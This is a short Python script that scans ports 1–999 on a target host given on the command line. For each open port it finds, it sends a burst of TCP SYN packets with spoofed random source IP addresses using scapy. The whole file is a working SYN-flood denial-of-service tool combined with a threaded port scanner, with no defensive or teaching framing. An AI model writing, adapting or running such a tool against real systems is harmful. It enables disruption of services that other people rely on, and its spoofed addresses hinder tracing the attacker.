import sys
import socket
import threading

from random import randint
from scapy.all import *
from queue import Queue
   
socket.setdefaulttimeout(0.5)  
thread_lock = threading.Lock()

if len(sys.argv) == 2:
    target = socket.gethostbyname(sys.argv[1]) 
else:
    print("Invalid IP Address!")
  
print("-" * 50)
print("Scanning Target: " + target)
print("-" * 50)

def randomIP():
	ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
	return ip

def randInt():
	x = randint(1000, 9000)
	return x

def SYN_flood(dst_port):
    total = 0
    print ("Packets are sending ...")
    counter = 20

    for x in range(0, counter):
        src_port = randInt()
        src_seq  = randInt()
        src_wdw  = randInt()

        IP_Packet     = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = target

        TCP_Packet = TCP ()
        TCP_Packet.sport    = src_port
        TCP_Packet.dport    = dst_port
        TCP_Packet.flags    = "S"
        TCP_Packet.seq      = src_seq
        TCP_Packet.window   = src_wdw


        # raw = Raw(b"X"*1024)
        # send(IP_Packet/TCP_Packet/raw, verbose=0)

        send(IP_Packet/TCP_Packet, verbose=0)
        total += 1

    print("\nTotal packets sent: {}\n".format(total))

def scan_port(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = s.connect_ex((target, port))
    if result == 0:
        with thread_lock:
            print("Port {}: OPEN".format(port))
            SYN_flood(port)
            s.close()

def threader():
    while True:
        worker = q.get()
        scan_port(worker)
        q.task_done()

q = Queue()

for i in range(1, 1000):
    t = threading.Thread(target = threader)
    t.daemon = True
    t.start()

for worker in range(1, 1000):
   q.put(worker)

q.join()